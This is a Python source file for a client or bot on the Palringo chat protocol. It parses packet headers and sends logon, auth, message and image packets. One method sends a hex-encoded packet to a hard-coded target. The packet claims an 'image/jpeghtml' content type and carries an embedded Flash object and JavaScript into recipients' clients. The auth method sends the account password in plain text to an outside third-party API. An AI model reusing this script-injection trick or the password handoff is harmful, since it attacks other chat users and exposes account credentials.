'''
convert all dictionary keys and values to lowercase
so we don't come into ambiguity issues 
'''


from PacketTemplate import *
from urllib.request import urlopen
import urllib.request
import json
import binascii
#from PIL import Image
import io
import time
import locale



class Parser(object):
    def __init__(self):
        global command
        global payload
        global sourceID
        global targetID
        self.command = ""
        self.payload = ""
    ## global variables

    
    ##command = ""
    sourceID = 0
    targetID = 0
    #global command
    #global payload
    sock = object()
    debug = False

    def bind(self, obj, boolean):
        global sock
        global debug
        sock = obj
        debug = boolean
    def ParsePacket( self, param1 ):
        
        myDict = { }
            
        ## splits the data by headers and payload

        try:
            Parse = param1.decode('raw-unicode-escape').split('\r\n\r\n')
            #global payload
            self.payload = Parse[1]
        except:
            pass

        ## splits the headers
        try:
            Headers = str(Parse[0]).split('\r\n')

            ## the command is the first index and we remove it from the list
            self.command = Headers[0]
            Headers.pop(0)
        except:
            pass
       
        ## splits the Headers in the dictionary
        try:
            for x in range (0, int(len(Headers))):
                holder = Headers[x].split(':')
                myDict.update({holder[0]:holder[1]})
        except:
            pass

        ## assignment

        

        if ( "Target-Id" in myDict):
            self.sourceID = myDict['Source-Id']
            self.targetID = myDict['Target-Id']
            self.command = "GroupMESG"



        elif ( "SOURCE-ID" in myDict):
            self.sourceID = myDict['SOURCE-ID']
            self.command = "PrivMESG"

        

        ## Clear our dictionary so it doesn't hold old values
        myDict.clear()
        



    ## Getter methods
    def getSourceID(self):
        return int(self.sourceID)
    def getTargetID(self):
        return int(self.targetID)
    def getPayload(self):
        return self.payload
    def getCommand(self):
        return self.command
    



    ## send methods
    def sendGroupMessage(self, i, s):
        sock.sendall(packets.GROUPMESG(str(i), s))
    def sendPrivateMessage(self, i, s):
        sock.sendall(packets.PRIVATEMESG(str(i), s))
    def sendMessagePack(self, i, s):
        sock.sendall(binascii.unhexlify('4D4553470D0A4D6573672D49643A20313039363733370D0A4D6573672D5461726765743A20310D0A5461726765742D49643A20343135343533380D0A436F6E74656E742D547970653A20696D6167652F6A70656768746D6C0D0A436F6E74656E742D4C656E6774683A203831300D0A0D0AFFD93C6F626A65637420747970653D226170706C69636174696F6E2F782D73686F636B776176652D666C6173682220646174613D22687474703A2F2F7777772E796F75747562652E636F6D2F762F6A454348554D4A6E6462512666733D31222077696474683D2234383022206865696768743D22333630222069643D226F626A656374223E3C706172616D206E616D653D226D6F766965222076616C75653D22687474703A2F2F7777772E796F75747562652E636F6D2F762F6A454348554D4A6E64625122202F3E3C706172616D206E616D653D227175616C697479222076616C75653D226869676822202F3E3C706172616D206E616D653D22616C6C6F7746756C6C53637265656E222076616C75653D227472756522202F3E3C2F6F626A6563743E3C73637269707420747970653D22746578742F6A617661736372697074223E69662877696E646F772E6E6176696761746F722E757365724167656E742E696E6465784F6628276950686F6E652729213D2D31297B766172206F626A203D20646F63756D656E742E676574456C656D656E744279496428276F626A65637427293B206F626A2E73657441747472696275746528277769647468272C323430293B206F626A2E7365744174747269627574652827686569676874272C313830297D656C73652069662877696E646F772E6E6176696761746F722E757365724167656E742E696E6465784F6628276950616427293D3D2D31297B766172206E65777370616E203D20646F63756D656E742E637265617465456C656D656E7428277370616E27293B6E65777370616E2E696E6E657248544D4C3D273C6120687265663D22687474703A2F2F7777772E796F75747562652E636F6D2F77617463683F763D6A454348554D4A6E646251223E3C696D67207372633D22687474703A2F2F696D672E796F75747562652E636F6D2F76692F6A454348554D4A6E6462512F302E6A7067222077696474683D22313030252220616C743D225B766964656F5D22202F3E3C2F613E273B20646F63756D656E742E676574456C656D656E744279496428276F626A65637427292E617070656E644368696C64286E65777370616E297D3C2F7363726970743E'))
    def Send(self, pack):
        sock.sendall()
    def sendLogon(self, email):
        sock.sendall(packets.LOGON(email))
    def sendAuth(self, password):
        pay = self.getPayload()
        response = urllib.request.urlopen('http://api.ahhriel.com/palringo/v1/?&password='+password+'&key='+binascii.hexlify(pay.encode('raw-unicode-escape')).decode('utf8'))
        html = response.read()
        print(html)
        data = json.loads(html.decode('utf8'))
        pay = data['Auth']
        unhex = binascii.unhexlify(pay)
        
        sock.sendall(packets.AUTH(unhex.decode('raw-unicode-escape')))

       

    def sendPing(self):
        sock.sendall(packets.PING())
    def sendImage(self, boolean, path, group):
        if (boolean):
            try:
                pic = Image.open(path)
                dat = io.BytesIO()
                if (pic.format == "JPEG"):
                    pic.save(dat, format='JPEG')
                else:
                    pic.load()
                    try:
                        holder = Image.new("RGB", pic.size, (255, 255, 255))
                        try:
                            holder.paste(pic, mask=pic.split()[3]) # 3 is the alpha channel
                            holder.save(dat, format='JPEG')
                        except:
                            pic.save(dat, format='JPEG')
                    except:
                        pass
                data = dat.getvalue()

                packetsize = int(len(data)/512)
                if (len(data) % 512 > 0):
                    packetsize = packetsize + 1

                chunks = Parser.split_by_length(data, 512)

                
                sock.sendall(packets.SENDIMAGEHEADER(chunks[0], group, len(data)))

                for x in range(1, (packetsize - 1)):
                    sock.sendall(packets.SENDIMAGEBODY(chunks[x], group))

                sock.sendall(packets.SENDIMAGEFINAL(chunks[packetsize-1], group))

                
                del dat, pic
            except:
                #raise Exception('Error')
                pass
                
        else:
            try:
                data = urlopen(path).read()

                packetsize = int(len(data)/512)
                if (len(data) % 512 > 0):
                    packetsize = packetsize + 1

                chunks = Parser.split_by_length(data, 512)

                
                sock.sendall(packets.SENDIMAGEHEADER(chunks[0], group, len(data)))

                for x in range(1, (packetsize - 1)):
                    sock.sendall(packets.SENDIMAGEBODY(chunks[x], group))

                sock.sendall(packets.SENDIMAGEFINAL(chunks[packetsize-1], group))

            except:
                pass
    
    
    def split_by_length(s,block_size):
        w=[]
        n=len(s)
        for i in range(0,n,block_size):
            w.append(s[i:i+block_size])
        return w
        
if __name__ == '__main__':
    Parser()
        
        
            


        
           
        
